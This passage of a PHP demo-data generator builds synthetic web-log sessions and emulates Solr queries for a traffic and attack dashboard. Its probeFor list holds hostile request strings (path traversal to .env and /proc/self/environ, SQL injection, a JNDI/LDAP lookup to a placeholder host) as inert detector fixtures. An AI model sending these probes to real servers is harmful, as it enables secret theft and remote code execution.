     * Apply a browser identity to a session document.
     *
     * @param array<string,mixed> $doc
     * @param array{0:string,1:int,2:string,3:string} $b
     * @return array<string,mixed>
     */
    private static function withBrowser(array $doc, array $b): array
    {
        $uas = [
            'Chrome'  => 'Mozilla/5.0 (%OS%) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%V%.0.0.0 Safari/537.36',
            'Safari'  => 'Mozilla/5.0 (%OS%) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%V%.0 Safari/605.1.15',
            'Firefox' => 'Mozilla/5.0 (%OS%; rv:%V%.0) Gecko/20100101 Firefox/%V%.0',
            'Edge'    => 'Mozilla/5.0 (%OS%) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%V%.0.0.0 Safari/537.36 Edg/%V%.0.0.0',
        ];
        $osTokens = [
            'macOS'   => 'Macintosh; Intel Mac OS X 10_15_7',
            'Windows' => 'Windows NT 10.0; Win64; x64',
            'Linux'   => 'X11; Linux x86_64',
            'iOS'     => 'iPhone; CPU iPhone OS 18_2 like Mac OS X',
            'Android' => 'Linux; Android 15; Pixel 9',
        ];
        $doc['browser_s'] = $b[0];
        $doc['browser_ver_i'] = $b[1];
        $doc['os_s'] = $b[2];
        $doc['device_s'] = $b[3];
        $doc['ua_s'] = str_replace(
            ['%OS%', '%V%'],
            [$osTokens[$b[2]] ?? 'Unknown', (string) $b[1]],
            $uas[$b[0]] ?? $uas['Chrome']
        );
        return $doc;
    }

    /**
     * Which virtual host served a session, drawn from the odds for its population.
     *
     * Deterministic from the session's index and DELIBERATELY NOT from mt_rand(): the whole
     * demo world is generated from one fixed seed so that screenshots are reproducible, and
     * drawing one more number per session inside that loop would shift every subsequent draw
     * and silently renumber traffic, timings and addresses that already tell a story. crc32
     * over the index is uncorrelated with everything else derived from it and costs the
     * generator nothing.
     */
    private static function host(int $i, string $class): string
    {
        $odds = self::HOST_ODDS[$class] ?? self::HOST_ODDS['default'];
        $roll = crc32('host:' . $i) % 100;

        foreach ($odds as $n => $ceiling) {
            if ($roll < $ceiling) {
                return self::HOSTS[$n];
            }
        }
        return self::HOSTS[0];
    }

    /** Deterministic IP inside a per-ASN pseudo-range. */
    private static function ip(int $asn): string
    {
        return sprintf('%d.%d.%d.%d', 100 + ($asn % 90), mt_rand(0, 255), mt_rand(0, 255), mt_rand(1, 254));
    }

    /**
     * An address drawn from a small fixed pool.
     *
     * Used for the automation branches. A headless scraper usually runs on a handful of
     * rented machines and reuses their addresses; only the proxy-fleet branch rotates
     * through many. Giving every bot a fresh random address would make every cluster look
     * like a fleet and would teach the reader exactly the wrong thing.
     */
    private static function poolIp(string $tag, int $size, int $i, int $asn): string
    {
        $h = crc32($tag . ':' . ($i % $size));
        return sprintf('%d.%d.%d.%d', 45 + ($asn % 60), ($h >> 16) & 0xFF, ($h >> 8) & 0xFF, 1 + ($h & 0xFD));
    }

    /**
     * The proxy fleet's exit addresses.
     *
     * Drawn from a fixed pool of 47 so the fingerprint view shows a stable, striking
     * "47 distinct IPs, one fingerprint" — which is the README hero image.
     */
    private static function fleetIp(int $i): string
    {
        $pool = [];
        for ($n = 0; $n < 47; $n++) {
            $pool[] = sprintf('195.%d.%d.%d', 64 + ($n % 9), 100 + $n, 3 + (($n * 7) % 200));
        }
        return $pool[$i % 47];
    }

    /**
     * Build (once) hit documents for every session, for the Performance view and the
     * session drill-down timeline.
     *
     * Capped at 12 hits per session: enough for a legible timeline, small enough that the
     * whole demo world stays a few thousand rows and renders instantly.
     *
     * Every hit carries its session's `host_s`, because the virtual-host selector scopes the
     * hits core as well as the sessions core: a hit set that did not name a host would make
     * picking a site empty the Performance view while the rest of the dashboard filled.
     *
     * @return array<int,array<string,mixed>>
     */
    private static function hits(): array
    {
        if (self::$hits !== null) {
            return self::$hits;
        }
        mt_srand(self::SEED + 1);
        $out = [];

        foreach (self::sessions() as $s) {
            $n = min(12, max(1, (int) $s['hits_i']));
            $startTs = strtotime((string) $s['ts_start']);
            $spanSec = max(1, (int) round(((int) $s['log_span_ms_l']) / 1000));
            $paths = (array) ($s['paths_ss'] ?? ['/']);

            for ($k = 0; $k < $n; $k++) {
                $isAsset = $k > 0 && ($s['assets_i'] ?? 0) > 0 && mt_rand(0, 100) < 65;
                $path = $isAsset
                    ? ['/assets/app.css', '/assets/app.js', '/img/logo.svg', '/img/hero.webp'][mt_rand(0, 3)]
                    : (string) $paths[$k % count($paths)];

                $status = 200;
                $r = mt_rand(1, 100);
                if ($r > 97) {
                    $status = 500;
                } elseif ($r > 90) {
                    $status = 404;
                } elseif ($r > 80 && ($s['got_304_b'] ?? false)) {
                    $status = 304;
                }

                $base = $isAsset ? mt_rand(900, 9000) : mt_rand(18000, 190000);
                if ($path === '/api' || $path === '/docs') {
                    $base = (int) ($base * 2.4);
                }
                if (mt_rand(1, 100) > 96) {
                    $base *= mt_rand(4, 14);
                }

                $query = null;

                /* A LITTLE HOSTILE TRAFFIC, because every site on the public internet has some and
                   a demo Attacks view with an empty table would misrepresent the product in the
                   opposite direction from the usual one. It is deliberately ordinary: mostly
                   refused, a couple answered, all of it from sessions the scorer already calls
                   automation, so the demo world stays internally consistent. */
                $probe = self::probeFor($s, $k);
                if ($probe !== null) {
                    [$path, $query, $status] = $probe;
                    $isAsset = false;
                }

                $hit = [
                    'id'            => sha1($s['id'] . ':' . $k),
                    'ts'            => self::iso($startTs + (int) round($spanSec * ($n > 1 ? $k / ($n - 1) : 0))),
                    'session_id_s'  => $s['id'],
                    'session_seq_i' => $k + 1,
                    'method_s'      => $k === 0 ? 'GET' : (mt_rand(0, 40) === 0 ? 'POST' : 'GET'),
                    'path_s'        => $path,
                    'status_i'      => $status,
                    'status_class_s' => ((int) ($status / 100)) . 'xx',
                    'bytes_l'       => $status === 304 ? 0 : mt_rand(400, 180000),
                    'dur_us_l'      => $base,
                    'kind_s'        => $isAsset ? 'asset' : 'html',
                    'asset_kind_s'  => $isAsset ? ['css', 'js', 'img', 'img'][mt_rand(0, 3)] : null,
                    'proto_s'       => 'HTTP/2',
                    'host_s'        => $s['host_s'],
                    'ip_s'          => $s['ip_s'],
                    'as_type_s'     => $s['as_type_s'],
                    'rdns_s'        => isset($s['rdns_s']) ? (string) $s['rdns_s'] : null,
                    'ua_s'          => isset($s['ua_s']) ? (string) $s['ua_s'] : null,
                    'ua_bot_b'      => $s['ua_bot_b'] ?? null,
                    'ua_bot_cat_s'  => $s['ua_bot_cat_s'] ?? null,
                    'bot_verdict_s' => $s['bot_verdict_s'] ?? 'unknown',
                ];
                if ($query !== null) {
                    $hit['query_s'] = $query;
                }
                foreach (['asset_kind_s', 'rdns_s', 'ua_s', 'ua_bot_b', 'ua_bot_cat_s'] as $optional) {
                    if (($hit[$optional] ?? null) === null) {
                        unset($hit[$optional]);
                    }
                }
                if (!empty($s['referer_s']) && $k === 0) {
                    $hit['referer_s'] = $s['referer_s'];
                }
                if (($s['as_type_s'] ?? '') === 'mobile') {
                    unset($hit['dur_us_l']);
                }

                /* THE REAL DETECTOR, over the synthetic world. The demo must not be able to show a
                   pattern the shipped rules would not produce, or a screenshot becomes a claim the
                   product cannot keep — so the fixtures do not hand-write `hit_flags_ss`, they run
                   Score\Attacks over each synthetic request exactly as bin/loghound-tail does. */
                $out[] = Attacks::apply($hit);
            }
        }

        self::$hits = $out;
        self::foldFlagsIntoSessions();

        return $out;
    }

    /**
     * The hostile request this demo hit is, or null for an ordinary one.
     *
     * Deterministic against the seeded generator, and scoped to sessions the scorer already
     * judged to be automation: a demo world where a human session is probing for `.env` would
     * teach the wrong thing about what the panel is showing.
     *
     * @param array<string,mixed> $s
     * @return array{0:string,1:string,2:int}|null path, query string, status
     */
    private static function probeFor(array $s, int $k): ?array
    {
        $verdict = (string) ($s['bot_verdict_s'] ?? '');
        if ($verdict !== 'bot' && $verdict !== 'likely_bot') {
            return null;
        }
        if (mt_rand(1, 100) > 22) {
            return null;
        }

        /* MOSTLY REFUSED, which is the honest shape of this traffic: a webserver answers almost
           every probe with a 404 and that is the webserver working. The handful of 200s are what
           the first card on the page exists to surface. */
        $probes = [
            ['/api/uploads/%2e%2e%2f%2e%2e%2f%2e%2e%2f.env', '', 404],
            ['/icons/.%2e/.%2e/.%2e/.%2e/proc/self/environ', '', 404],
            ['/.git/config', '', 404],
            ['/wp-login.php', '', 404],
            ['/phpmyadmin/index.php', '', 404],
            ['/vendor/phpunit/phpunit/src/util/php/eval-stdin.php', '', 404],
            ['/actuator/gateway/routes', '', 401],
            ['/search', 'q=%27+UNION+SELECT+password+FROM+users--', 200],
            ['/index.php', 's=${jndi:ldap://198.51.100.9/a}', 404],
            ['/.well-known/pki.php', '', 404],
            ['/backup/site.sql', '', 403],
            ['/install.php', '', 302],
        ];

        return $probes[($k + (int) hexdec(substr(sha1((string) $s['id']), 0, 4))) % count($probes)];
    }

    /**
     * Copy each session's union of hit flags back onto its session document.
     *
     * The demo half of what Sessionizer::accumulate() does at ingest. Without it the
     * impersonation card — the only sessions-plane card on the Attacks view — would be empty on a
     * page whose other five cards were full, which reads as a broken card rather than as a demo.
     */
    private static function foldFlagsIntoSessions(): void
    {
        if (self::$sessions === null || self::$hits === null) {
            return;
        }

        $bySession = [];
        foreach (self::$hits as $hit) {
            $id = (string) ($hit['session_id_s'] ?? '');
            if ($id === '') {
                continue;
            }
            foreach ((array) ($hit['hit_flags_ss'] ?? []) as $flag) {
                $bySession[$id][(string) $flag] = true;
            }
        }

        foreach (self::$sessions as $i => $session) {
            $id = (string) ($session['id'] ?? '');
            self::$sessions[$i]['hit_rules_i'] = Attacks::RULE_VERSION;
            if (isset($bySession[$id])) {
                $flags = array_keys($bySession[$id]);
                sort($flags);
                self::$sessions[$i]['hit_flags_ss'] = $flags;
            }
        }
    }

    /** Format a unix timestamp the way Solr formats a pdate. */
    private static function iso(int $ts): string
    {
        return gmdate('Y-m-d\TH:i:s\Z', $ts);
    }

    /**
     * Filter the world by a request's `q` and `fq`.
     *
     * @param array<int,array<string,mixed>> $docs
     * @param array<string,mixed>            $params
     * @return array<int,array<string,mixed>>
     */
    private static function applyQuery(array $docs, array $params): array
    {
        foreach ((array) ($params['fq'] ?? []) as $fq) {
            $docs = self::filter($docs, (string) $fq);
        }
        $q = (string) ($params['q'] ?? '*:*');
        if ($q !== '*:*' && isset($params['uq'])) {
            $needle = mb_strtolower(trim((string) $params['uq']));
            if ($needle !== '') {
                $docs = array_values(array_filter($docs, static function (array $d) use ($needle): bool {
                    $hay = mb_strtolower(implode(' ', array_filter([
                        (string) ($d['ua_s'] ?? ''), (string) ($d['as_org_s'] ?? ''),
                        (string) ($d['netname_s'] ?? ''), (string) ($d['city_s'] ?? ''),
                        (string) ($d['country_s'] ?? ''), (string) ($d['ip_s'] ?? ''),
                        (string) ($d['entry_path_s'] ?? ''), (string) ($d['path_s'] ?? ''),
                        implode(' ', (array) ($d['paths_ss'] ?? [])),
                    ])));
                    return str_contains($hay, $needle);
                }));
            }
        } elseif ($q !== '*:*' && $q !== '') {
            $docs = self::filter($docs, $q);
        }
        return $docs;
    }

    /**
     * Evaluate one filter expression against the world.
     *
     * Understands only the shapes Panel\Query produces: ` AND `-joined clauses, optional
     * `-` negation, and a right-hand side that is `(a OR b)`, `"quoted"`, `[a TO b]` or a
     * bare token. Anything else matches everything and is left alone — a demo that
     * silently drops rows would be more confusing than one that shows too many.
     *
     * @param array<int,array<string,mixed>> $docs
     * @return array<int,array<string,mixed>>
     */
    private static function filter(array $docs, string $expr): array
    {
        $expr = trim($expr);
        if ($expr === '' || $expr === '*:*') {
            return $docs;
        }
        foreach (explode(' AND ', $expr) as $clause) {
            $clause = trim($clause);
            if ($clause === '') {
                continue;
            }
            $negate = false;
            if ($clause[0] === '-') {
                $negate = true;
                $clause = substr($clause, 1);
            }
            $pos = strpos($clause, ':');
            if ($pos === false) {
                continue;
            }
            $field = substr($clause, 0, $pos);
            $rhs   = trim(substr($clause, $pos + 1));

            $docs = array_values(array_filter($docs, static function (array $d) use ($field, $rhs, $negate): bool {
                $ok = self::matches($d, $field, $rhs);
                return $negate ? !$ok : $ok;
            }));
        }
        return $docs;
    }

    /**
     * Test one field of one document against a right-hand side expression.
     *
     * @param array<string,mixed> $doc
     */
    private static function matches(array $doc, string $field, string $rhs): bool
    {
        $value = $doc[$field] ?? null;

        if (str_starts_with($rhs, '[') && str_ends_with($rhs, ']')) {
            $inner = substr($rhs, 1, -1);
            [$lo, $hi] = array_pad(explode(' TO ', $inner, 2), 2, '*');
            if ($value === null) {
                return false;
            }
            if ($lo === '*' && $hi === '*') {
                return true;
            }
            $isDate = is_string($value) && preg_match('/^\d{4}-\d{2}-\d{2}T/', $value);
            $v  = $isDate ? (float) strtotime($value) : (float) $value;
            $lv = $lo === '*' ? -INF : (float) ($isDate ? self::dateMath($lo) : $lo);
            $hv = $hi === '*' ? INF : (float) ($isDate ? self::dateMath($hi) : $hi);
            return $v >= $lv && $v <= $hv;
        }

        if (str_starts_with($rhs, '(') && str_ends_with($rhs, ')')) {
            foreach (explode(' OR ', substr($rhs, 1, -1)) as $opt) {
                if (self::matches($doc, $field, trim($opt))) {
                    return true;
                }
            }
            return false;
        }

        $want = trim($rhs, '"');
        $want = str_replace(['\\"', '\\\\'], ['"', '\\'], $want);

        if (is_array($value)) {
            return in_array($want, array_map('strval', $value), true);
        }
        if (is_bool($value)) {
            return $want === ($value ? 'true' : 'false');
        }
        if ($value === null) {
            return false;
        }
        return (string) $value === $want;
    }

    /**
     * Evaluate the subset of Solr date math the panel emits: `NOW`, `NOW-<n><UNIT>` and
     * an optional trailing `/UNIT` rounding.
     */
    private static function dateMath(string $expr): int
    {
        $expr = trim($expr);
        if (preg_match('/^\d{4}-\d{2}-\d{2}T/', $expr)) {
            return (int) strtotime($expr);
        }
        $t = self::now();
        if (preg_match('/^NOW\s*-\s*(\d+)(SECOND|MINUTE|HOUR|DAY)/i', $expr, $m)) {
            $mult = ['SECOND' => 1, 'MINUTE' => 60, 'HOUR' => 3600, 'DAY' => 86400];
            $t -= ((int) $m[1]) * $mult[strtoupper($m[2])];
        }
        if (preg_match('#/(SECOND|MINUTE|HOUR|DAY)$#i', $expr, $m)) {
            $round = ['SECOND' => 1, 'MINUTE' => 60, 'HOUR' => 3600, 'DAY' => 86400];
            $step = $round[strtoupper($m[1])];
            $t = intdiv($t, $step) * $step;
        }
        return $t;
    }

    /** Convert a `+<n><UNIT>` gap string to seconds. */
    private static function gapSeconds(string $gap): int
    {
        if (preg_match('/^\+?(\d+)(SECOND|MINUTE|HOUR|DAY)$/iD', trim($gap), $m)) {
            $mult = ['SECOND' => 1, 'MINUTE' => 60, 'HOUR' => 3600, 'DAY' => 86400];
            return ((int) $m[1]) * $mult[strtoupper($m[2])];
        }
        return 3600;
    }

    /**
     * Run a json.facet structure over a document set.
     *
     * @param array<int,array<string,mixed>> $docs
     * @param array<string,mixed>            $facet
     * @return array<string,mixed>
     */
    private static function compute(array $docs, array $facet, ?callable $lift = null): array
    {
        $out = ['count' => count($docs)];

        foreach ($facet as $key => $def) {
            if (is_string($def)) {
                $out[$key] = self::aggregate($docs, $def);
                continue;
            }
            if (!is_array($def)) {
                continue;
            }
            $type = (string) ($def['type'] ?? '');

            /* A facet that excludes a tag is computed over the domain WITHOUT that filter, which
               is the whole mechanism that keeps a filtered dimension listing every value it has.
               Only the top level can do it here, exactly as in Solr: a sub-facet inherits its
               parent's domain. */
            $tags = (array) ($def['domain']['excludeTags'] ?? []);
            $scope = ($tags !== [] && $lift !== null) ? $lift($tags) : $docs;

            if ($type === 'query') {
                $sub = self::filter($scope, (string) ($def['q'] ?? '*:*'));
                $out[$key] = self::compute($sub, (array) ($def['facet'] ?? []), $lift);
            } elseif ($type === 'terms') {
                $out[$key] = ['buckets' => self::terms($scope, $def)];
                if (!empty($def['numBuckets'])) {
                    $out[$key]['numBuckets'] = self::distinct($scope, (string) ($def['field'] ?? ''));
                }
            } elseif ($type === 'range') {
                $out[$key] = ['buckets' => self::rangeBuckets($scope, $def)];
            }
        }

        return $out;
    }

    /**
     * How many DISTINCT values a field holds across these documents.
     *
     * Solr's `numBuckets`, which the value browser needs to say "the 2,000 most common of 48,391"
     * rather than presenting a truncated list as a complete one. Counted over the whole domain
     * rather than over the returned page, which is the point of it.
     *
     * @param array<int,array<string,mixed>> $docs
     */
    private static function distinct(array $docs, string $field): int
    {
        $seen = [];
        foreach ($docs as $d) {
            foreach ((array) ($d[$field] ?? []) as $value) {
                if (is_scalar($value) && $value !== '') {
                    $seen[is_bool($value) ? ($value ? 'true' : 'false') : (string) $value] = true;
                }
            }
        }
        return count($seen);
    }

    /**
     * Terms facet: group by field value, sort, limit, recurse into sub-facets.
     *
     * @param array<int,array<string,mixed>> $docs
     * @param array<string,mixed>            $def
     * @return array<int,array<string,mixed>>
     */
    private static function terms(array $docs, array $def): array
    {
        $field = (string) ($def['field'] ?? '');
        $limit = (int) ($def['limit'] ?? 10);
        $groups = [];

        foreach ($docs as $d) {
            $v = $d[$field] ?? null;
            if ($v === null) {
                continue;
            }
            foreach ((array) $v as $one) {
                $k = is_bool($one) ? ($one ? 'true' : 'false') : (string) $one;
                $groups[$k][] = $d;
            }
        }

        $buckets = [];
        foreach ($groups as $val => $members) {
            $b = ['val' => $val, 'count' => count($members)];
            $b += self::compute($members, (array) ($def['facet'] ?? []));
            unset($b['count']);
            $b['count'] = count($members);
            $buckets[] = $b;
        }

        $sort = (string) ($def['sort'] ?? 'count desc');
        [$sf, $sd] = array_pad(explode(' ', $sort, 2), 2, 'desc');
        usort($buckets, static function (array $a, array $b) use ($sf, $sd) {
            $av = $a[$sf] ?? 0;
            $bv = $b[$sf] ?? 0;
            $cmp = $av <=> $bv;
            return $sd === 'asc' ? $cmp : -$cmp;
        });

        return array_slice($buckets, 0, max(1, $limit));
    }

    /**
     * Range facet over a date field, or over a numeric field when `start` is a number.
     *
     * The numeric branch exists for the bot-score histogram; everything else in the panel
     * ranges over time.
     *
     * @param array<int,array<string,mixed>> $docs
     * @param array<string,mixed>            $def
     * @return array<int,array<string,mixed>>
     */
    private static function rangeBuckets(array $docs, array $def): array
    {
        $field = (string) ($def['field'] ?? 'ts');

        if (is_numeric($def['start'] ?? null)) {
            $start = (float) $def['start'];
            $end   = (float) ($def['end'] ?? 100);
            $gap   = max(0.0001, (float) ($def['gap'] ?? 10));
            $bins  = [];
            foreach ($docs as $d) {
                $v = $d[$field] ?? null;
                if (!is_numeric($v)) {
                    continue;
                }
                $v = (float) $v;
                if ($v < $start || $v >= $end + $gap) {
                    continue;
                }
                $bins[(int) floor(($v - $start) / $gap)][] = $d;
            }
            $buckets = [];
            for ($i = 0, $x = $start; $x < $end; $x += $gap, $i++) {
                $members = $bins[$i] ?? [];
                $b = ['val' => $x, 'count' => count($members)];
                $b += self::compute($members, (array) ($def['facet'] ?? []));
                $b['count'] = count($members);
                $buckets[] = $b;
            }
            return $buckets;
        }

        $start = self::dateMath((string) ($def['start'] ?? 'NOW-24HOUR'));
        $end   = self::dateMath((string) ($def['end'] ?? 'NOW'));
        $gap   = self::gapSeconds((string) ($def['gap'] ?? '+1HOUR'));

        $binned = [];
        foreach ($docs as $d) {
            $raw = $d[$field] ?? null;
            if ($raw === null) {
                continue;
            }
            $t = strtotime((string) $raw);
            if ($t === false || $t < $start || $t >= $end + $gap) {
                continue;
            }
            $binned[intdiv($t - $start, $gap)][] = $d;
        }

        $buckets = [];
        for ($t = $start, $i = 0; $t < $end; $t += $gap, $i++) {
            $members = $binned[$i] ?? [];
            $b = ['val' => self::iso($t), 'count' => count($members)];
            $b += self::compute($members, (array) ($def['facet'] ?? []));
            $b['count'] = count($members);
            $buckets[] = $b;
        }
        return $buckets;
    }

    /**
     * Evaluate an aggregation string: sum/avg/min/max/unique/percentile/count.
     *
     * Returns null when there is nothing to aggregate, which is what Solr does and what
     * the UI needs in order to print "no data" rather than "0".
     *
     * @param array<int,array<string,mixed>> $docs
     * @return float|int|string|null
     */
    private static function aggregate(array $docs, string $expr)
    {
        if (!preg_match('/^(\w+)\(([^)]*)\)$/D', trim($expr), $m)) {
            return null;
        }
        $fn = strtolower($m[1]);
        $args = array_map('trim', explode(',', $m[2]));
        $field = $args[0];

        $values = [];
        $isDate = false;
        foreach ($docs as $d) {
            $v = $d[$field] ?? null;
            if ($v === null || is_array($v)) {
                if (is_array($v)) {
                    foreach ($v as $one) {
                        $values[] = $one;
                    }
                }
                continue;
            }
            if (is_string($v) && preg_match('/^\d{4}-\d{2}-\d{2}T/', $v)) {
                $isDate = true;
                $values[] = strtotime($v);
                continue;
            }
            $values[] = is_bool($v) ? ($v ? 1 : 0) : $v;
        }

        if ($fn === 'unique') {
            return count(array_unique(array_map('strval', $values)));
        }
        if ($values === []) {
            return null;
        }

        $nums = array_map('floatval', $values);
        switch ($fn) {
            case 'sum':
                return array_sum($nums);
            case 'avg':
                return array_sum($nums) / count($nums);
            case 'min':
                $v = min($nums);
                return $isDate ? self::iso((int) $v) : $v;
            case 'max':
                $v = max($nums);
                return $isDate ? self::iso((int) $v) : $v;
            case 'percentile':
                sort($nums);
                $p = isset($args[1]) ? (float) $args[1] : 50.0;
                $idx = (int) round(($p / 100) * (count($nums) - 1));
                return $nums[max(0, min(count($nums) - 1, $idx))];
            default:
                return null;
        }
    }
}
